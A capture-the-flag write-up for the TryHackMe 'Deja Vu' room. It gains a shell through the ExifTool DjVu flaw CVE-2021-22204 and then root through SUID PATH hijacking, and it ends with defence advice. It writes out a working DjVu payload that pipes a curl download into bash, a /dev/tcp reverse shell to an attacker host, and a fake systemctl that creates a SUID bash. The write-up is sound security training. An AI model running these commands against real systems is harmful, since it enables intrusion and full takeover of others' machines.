# TryHackMe: Deja Vu — Writeup

## Overview

| Detail       | Info                                      |
|--------------|-------------------------------------------|
| Room         | Deja Vu                                   |
| Difficulty   | Medium                                    |
| OS           | Linux (CentOS/RHEL 8)                     |
| Key Topics   | CVE-2021-22204, ExifTool RCE, SUID Abuse, PATH Hijacking |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Golang net/http server
|_http-title: Dog Gallery!
```

Two services: SSH on 22 and a Go-based web server on 80 hosting a "Dog Gallery" application.

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
/favicon.ico          (Status: 200)
/index.html           (Status: 301) [--> ./]
/upload               (Status: 301) [--> upload/]
```

The `/upload` endpoint is immediately interesting — it suggests user-controlled file uploads.

### Application Analysis

Examining `main.js` revealed the following API routes:

- `/dog/list` — returns JSON array of all dog entries
- `/dog/get/<id>` — returns the image file
- `/dogpic/?id=<id>` — detail page for a specific dog

The detail page (`dogpic.js`) revealed two additional API routes:

- `/dog/getmetadata/<id>` — returns title and caption
- `/dog/getexifdata/<id>` — returns EXIF metadata parsed from the uploaded image

The upload form at `/upload/` accepts an image file, title, and caption via POST to `/dog/upload`.

### Identifying the Vulnerability

Querying the EXIF endpoint for an existing image revealed the server-side tooling:

```bash
curl http://<TARGET_IP>/dog/getexifdata/0
```

Key finding in the response:

```json
"ExifToolVersion": 12.23
```

**ExifTool 12.23** is vulnerable to **CVE-2021-22204** — a remote code execution vulnerability affecting versions 7.44 through 12.23. The flaw exists in ExifTool's handling of DjVu file annotations: when parsing a specially crafted DjVu `ANTz` chunk, ExifTool evaluates embedded Perl code via `eval`, leading to arbitrary command execution.

---

## Initial Access — CVE-2021-22204

### Building the Exploit

**Step 1: Create a reverse shell script on the attacker machine.**

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1
EOF
```

**Step 2: Host it via a simple HTTP server.**

```bash
python3 -m http.server 8000 &
```

**Step 3: Create the DjVu payload.**

The payload uses a simple staged approach — download and execute — to avoid quoting and escaping issues inside the DjVu annotation context.

```bash
cat > payload.txt << 'EOF'
(metadata "\c${system(q[curl <ATTACKER_IP>:8000/shell.sh|bash])}")
EOF
```

**Step 4: Compress and assemble the DjVu file.**

```bash
bzz payload.txt payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```

### Triggering the Exploit

**Step 5: Start a listener.**

```bash
nc -lvnp 5555
```

**Step 6: Upload the malicious file.**

```bash
curl -X POST http://<TARGET_IP>/dog/upload \
  -F "image=@exploit.djvu;filename=exploit.djvu" \
  -F "title=CuteDog" \
  -F "caption=GoodBoy"
```

**Step 7: Trigger ExifTool parsing.**

```bash
curl http://<TARGET_IP>/dog/list          # find the new ID
curl http://<TARGET_IP>/dog/getexifdata/<ID>
```

When the server calls ExifTool to parse EXIF data from our uploaded file, it processes the DjVu annotation, which executes the embedded Perl `system()` call — fetching and running our reverse shell script.

```
Connection received on <TARGET_IP>
[dogpics@dejavu ~]$
```

### User Flag

```bash
cat /home/dogpics/user.txt
```

```
dejavu{735c0553063625f41879e57d5b4f3352}
```

---

## Privilege Escalation — SUID PATH Hijacking

### Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among standard SUID binaries, one stands out:

```
/home/dogpics/serverManager
```

```bash
ls -la /home/dogpics/serverManager
-rwsr-sr-x. 1 root root 17648 Sep 11  2021 /home/dogpics/serverManager
```

A custom SUID binary owned by **root**.

### Binary Analysis

Since `strings` was not available on the target, printable strings were extracted manually:

```bash
cat /home/dogpics/serverManager | tr -d '\0' | grep -aoP '[\x20-\x7e]{4,}'
```

Key findings:

```
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 - Get server status
1 - Restart server
systemctl status --no-pager dogpics
sudo systemctl restart dogpics
```

The binary calls `systemctl` **without an absolute path**. Since it runs with SUID root privileges, we can exploit this via **PATH hijacking**.

### Exploitation

**Step 1: Create a malicious `systemctl` binary.**

```bash
echo '#!/bin/bash' > /tmp/systemctl
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/systemctl
chmod +x /tmp/systemctl
```

**Step 2: Prepend `/tmp` to PATH.**

```bash
export PATH=/tmp:$PATH
```

**Step 3: Trigger the SUID binary.**

```bash
echo "0" | /home/dogpics/serverManager
```

When `serverManager` calls `systemctl`, it resolves to our malicious `/tmp/systemctl` first, which creates a SUID copy of bash.

**Step 4: Get a root shell.**

```bash
/tmp/rootbash -p
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

```
dejavu{5ad931368bdc46f856febe4834ace627}
```

---

## Lessons Learned

1. **CVE-2021-22204** is a powerful RCE in ExifTool (<= 12.23) triggered by DjVu annotation parsing. Any application that processes user-uploaded images with a vulnerable ExifTool version is at risk.

2. **Staged payloads** (download-and-execute) are more reliable than inline reverse shells when dealing with nested quoting contexts (Perl inside DjVu annotations). Keeping the injected command simple avoids escaping nightmares.

3. **SUID binaries calling commands without absolute paths** are a classic privilege escalation vector. Always check custom SUID files and analyze what commands they invoke.

4. **Defense recommendations:**
   - Update ExifTool to the latest version.
   - Validate and sanitize uploaded files server-side (magic bytes, not just extensions).
   - Use absolute paths in privileged binaries.
   - Apply the principle of least privilege — avoid SUID where possible.
